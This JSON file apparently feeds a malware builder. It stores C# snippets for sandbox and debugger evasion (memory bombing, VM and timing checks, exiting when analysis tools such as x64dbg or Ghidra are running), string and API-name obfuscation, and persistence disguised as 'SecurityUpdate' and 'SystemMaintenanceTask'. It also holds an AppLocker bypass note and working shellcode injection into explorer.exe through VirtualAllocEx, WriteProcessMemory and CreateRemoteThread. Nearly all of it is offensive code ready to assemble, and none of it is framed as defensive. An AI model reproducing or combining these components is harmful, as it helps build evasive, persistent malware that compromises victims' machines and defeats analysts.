{
  "AntiAnalysis": {
    "ping_delay": [
      "// --- Randomized Ping Delay ---",
      "Random rand = new Random();",
      "int lastOctet = rand.Next(1, 255);",
      "string[] reservedBlocks = { \"192.0.2.\", \"198.51.100.\", \"203.0.113.\" };",
      "string baseIP = reservedBlocks[rand.Next(reservedBlocks.Length)];",
      "string IP = baseIP + lastOctet;",
      "System.Diagnostics.Process p = new System.Diagnostics.Process();",
      "p.StartInfo.FileName = \"cmd.exe\";",
      "p.StartInfo.Arguments = $\"/c ping -n 6 {IP} >nul\";",
      "p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;",
      "p.Start();",
      "p.WaitForExit();"
    ],
    
    "memory_bombing": [
      "// --- Memory Bombing Anti-Analysis ---",
      "try",
      "{",
      "    // Attempt to allocate large memory chunks to exhaust analysis resources",
      "    List<byte[]> memoryBombs = new List<byte[]>();",
      "    int bombSize = 50 * 1024 * 1024; // 50MB chunks",
      "    int maxBombs = 20; // Maximum 1GB total",
      "    ",
      "    for (int i = 0; i < maxBombs; i++)",
      "    {",
      "        try",
      "        {",
      "            byte[] bomb = new byte[bombSize];",
      "            // Fill with random data to prevent compression",
      "            Random rnd = new Random();",
      "            rnd.NextBytes(bomb);",
      "            memoryBombs.Add(bomb);",
      "            System.Threading.Thread.Sleep(10); // Brief pause",
      "        }",
      "        catch (OutOfMemoryException)",
      "        {",
      "            // Expected in constrained environments - continue execution",
      "            break;",
      "        }",
      "    }",
      "    ",
      "    // Brief delay to let analysis tools struggle",
      "    System.Threading.Thread.Sleep(1000);",
      "    ",
      "    // Clean up memory gradually",
      "    for (int i = memoryBombs.Count - 1; i >= 0; i--)",
      "    {",
      "        memoryBombs[i] = null;",
      "        if (i % 5 == 0) GC.Collect();",
      "    }",
      "    memoryBombs.Clear();",
      "}",
      "catch",
      "{",
      "    // Silently continue if memory bombing fails",
      "}"
    ],
    
    "vm_detection": [
      "// --- VM Detection ---",
      "try",
      "{",
      "    // Check for common VM artifacts",
      "    string[] vmArtifacts = {",
      "        \"VirtualBox\", \"VMware\", \"VBOX\", \"VMXNET\",",
      "        \"Virtual\", \"HyperV\", \"Xen\"",
      "    };",
      "    ",
      "    using (var searcher = new System.Management.ManagementObjectSearcher(\"SELECT * FROM Win32_ComputerSystem\"))",
      "    {",
      "        foreach (var obj in searcher.Get())",
      "        {",
      "            string model = obj[\"Model\"]?.ToString()?.ToLower() ?? \"\";",
      "            string manufacturer = obj[\"Manufacturer\"]?.ToString()?.ToLower() ?? \"\";",
      "            ",
      "            foreach (string artifact in vmArtifacts)",
      "            {",
      "                if (model.Contains(artifact.ToLower()) || manufacturer.Contains(artifact.ToLower()))",
      "                {",
      "                    // VM detected - could exit or continue with different behavior",
      "                    System.Threading.Thread.Sleep(5000); // Additional delay in VMs",
      "                    break;",
      "                }",
      "            }",
      "        }",
      "    }",
      "}",
      "catch",
      "{",
      "    // Ignore WMI errors",
      "}"
    ],
    
    "timing_check": [
      "// --- Timing-based Detection ---",
      "try",
      "{",
      "    var sw = System.Diagnostics.Stopwatch.StartNew();",
      "    System.Threading.Thread.Sleep(500); // Sleep for 500ms",
      "    sw.Stop();",
      "    ",
      "    // If sleep was much shorter, likely in analysis environment",
      "    if (sw.ElapsedMilliseconds < 400)",
      "    {",
      "        // Detected fast-forward/analysis - add extra delays",
      "        for (int i = 0; i < 10; i++)",
      "        {",
      "            System.Threading.Thread.Sleep(1000);",
      "        }",
      "    }",
      "}",
      "catch",
      "{",
      "    // Continue if timing check fails",
      "}"
    ],
    
    "user_interaction": [
      "// --- User Interaction Check ---",
      "try",
      "{",
      "    // Check for recent user activity",
      "    uint idleTime = GetLastInputTime();",
      "    ",
      "    // If system has been idle for too long, might be analysis environment",
      "    if (idleTime > 300000) // 5 minutes",
      "    {",
      "        System.Threading.Thread.Sleep(2000);",
      "    }",
      "}",
      "catch",
      "{",
      "    // Continue if user interaction check fails",
      "}"
    ],
    
    "debugger_detection": [
      "// --- Debugger Detection ---",
      "try",
      "{",
      "    if (System.Diagnostics.Debugger.IsAttached)",
      "    {",
      "        // Debugger detected - could exit or behave differently",
      "        System.Environment.Exit(0);",
      "    }",
      "    ",
      "    // Check for common debugging tools",
      "    Process[] processes = Process.GetProcesses();",
      "    string[] debuggerNames = { \"ollydbg\", \"x64dbg\", \"windbg\", \"ida\", \"ghidra\" };",
      "    ",
      "    foreach (Process proc in processes)",
      "    {",
      "        foreach (string debugger in debuggerNames)",
      "        {",
      "            if (proc.ProcessName.ToLower().Contains(debugger))",
      "            {",
      "                System.Environment.Exit(0);",
      "            }",
      "        }",
      "    }",
      "}",
      "catch",
      "{",
      "    // Continue if debugger detection fails",
      "}"
    ]
  },
  
  "Obfuscation": {
    "string_obfuscation": [
      "// --- String Obfuscation ---",
      "// ROT13 decode function for obfuscated strings",
      "static string DecodeROT13(string input)",
      "{",
      "    return new string(input.Select(x => (char)((x >= 'a' && x <= 'z') ? ",
      "        (x - 'a' + 13) % 26 + 'a' : (x >= 'A' && x <= 'Z') ? ",
      "        (x - 'A' + 13) % 26 + 'A' : x)).ToArray());",
      "}"
    ],
    
    "api_hashing": [
      "// --- API Hashing ---",
      "static uint HashAPI(string apiName)",
      "{",
      "    uint hash = 0;",
      "    foreach (char c in apiName)",
      "    {",
      "        hash = ((hash << 5) + hash) + (uint)c;",
      "    }",
      "    return hash;",
      "}"
    ]
  },
  
  "Persistence": {
    "registry_persistence": [
      "// --- Registry Persistence ---",
      "try",
      "{",
      "    string regPath = @\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\";",
      "    string appName = \"SecurityUpdate\";",
      "    string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;",
      "    ",
      "    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regPath, true);",
      "    key?.SetValue(appName, appPath);",
      "    key?.Close();",
      "}",
      "catch",
      "{",
      "    // Continue if persistence fails",
      "}"
    ],
    
    "scheduled_task": [
      "// --- Scheduled Task Persistence ---",
      "try",
      "{",
      "    string taskName = \"SystemMaintenanceTask\";",
      "    string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;",
      "    ",
      "    Process.Start(new ProcessStartInfo",
      "    {",
      "        FileName = \"schtasks\",",
      "        Arguments = $\"/create /tn \\\"{taskName}\\\" /tr \\\"{exePath}\\\" /sc onlogon /f\",",
      "        WindowStyle = ProcessWindowStyle.Hidden",
      "    });",
      "}",
      "catch",
      "{",
      "    // Continue if task creation fails",
      "}"
    ]
  },
  
  "AppLockerBypass": {
    "installutil_wrapper": [
      "// --- InstallUtil AppLocker Bypass ---",
      "// This technique uses InstallUtil.exe to bypass AppLocker restrictions",
      "// The main payload is executed through the Uninstall() method"
    ],
    
    "applocker_injection": [
      "// --- AppLocker-Safe Process Injection ---",
      "// Find a suitable target process for injection",
      "string processName = \"explorer\";", 
      "Process[] processes = Process.GetProcessesByName(processName);",
      "if (processes.Length == 0)",
      "{",
      "    Console.WriteLine($\"[!] Process {processName} not found.\");",
      "    return;",
      "}",
      "uint processId = (uint)processes[0].Id;",
      "Console.WriteLine($\"[*] Shellcode Injection into: {processName} (PID: {processId})\");",
      "",
      "// Open target process",
      "IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);",
      "if (hProcess == IntPtr.Zero)",
      "{",
      "    Console.WriteLine(\"[!] Failed to open process.\");",
      "    return;",
      "}",
      "Console.WriteLine($\"[+] Opened process with ID: {processId}\");",
      "",
      "// Allocate memory in target process",
      "Console.WriteLine($\"[*] Allocating {buf.Length} bytes in remote process...\");",
      "IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);",
      "if (allocMem == IntPtr.Zero)",
      "{",
      "    Console.WriteLine(\"[!] Memory allocation failed.\");",
      "    return;",
      "}",
      "Console.WriteLine($\"[+] Allocated memory at: 0x{allocMem.ToInt64():X}\");",
      "",
      "// Write shellcode to allocated memory",
      "IntPtr bytesWritten;",
      "bool writeMem = WriteProcessMemory(hProcess, allocMem, buf, (uint)buf.Length, out bytesWritten);",
      "if (!writeMem)",
      "{",
      "    Console.WriteLine(\"[!] WriteProcessMemory failed.\");",
      "    return;",
      "}",
      "Console.WriteLine(\"[+] Shellcode written!\");",
      "",
      "// Create remote thread to execute shellcode",
      "Console.WriteLine(\"[*] Creating remote thread...\");",
      "IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);",
      "if (hThread == IntPtr.Zero)",
      "{",
      "    Console.WriteLine(\"[!] CreateRemoteThread failed.\");",
      "    return;",
      "}",
      "Console.WriteLine($\"[+] Remote thread created at: 0x{hThread.ToInt64():X}\");",
      "Console.WriteLine(\"[*] Injection complete.\");",
      "Console.ReadLine();"
    ]
  }
}
